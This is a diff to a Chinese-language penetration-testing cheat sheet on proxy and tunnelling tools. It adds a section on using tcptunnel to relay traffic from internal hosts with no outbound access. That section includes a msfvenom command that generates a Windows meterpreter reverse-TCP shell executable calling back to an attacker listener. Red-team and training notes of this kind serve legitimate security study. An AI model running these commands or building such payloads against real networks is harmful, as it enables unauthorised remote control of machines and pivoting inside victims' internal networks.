@@ -21,7 +21,6 @@ empire && starkiller的体验还不错
 [Neo-reGeorg -- php](https://blog.csdn.net/qq_42094992/article/details/115143527)
 frp/nps
 
-[tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)
 
 -- for xp/2003
 3proxy 7.x / CCProxy
@@ -36,6 +35,19 @@ nc
 * 代理类别：HTTP代理、socks代理、telnet代理、ssl代理
 * 代理工具：EarthWorm、reGeorg(http代理)、proxifier(win)、sockscap64(win)、proxychains(linux)
 
+### tcptunnel 端口转发
+[tcptunnel 利用 TCP 隧道让内网不出网主机上线 MSF](https://mp.weixin.qq.com/s/iDAAC3BRPj2YaWkNZPWEDQ)
+
+> 192.168.0.120 为边缘机器
+```bash
+# x64
+192.168.142.110$ tcptunnel --local-port=1080 --remote-port=4444 --remote-host=192.168.0.120 --fork --buffer-size=8192 --stay-alive
+# x86
+192.168.142.110$ tcptunnel --local-port=1080 --remote-port=4444 --remote-host=192.168.0.120 --buffer-size=8192 --stay-alive
+
+## msf
+msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.142.110 lport=1080 -f exe -o shell.exe
+```
 ### lcx
 ```bash
 # 正向转发 lcx.exe -tran LocalPort RemoteHost RemotePOrt 
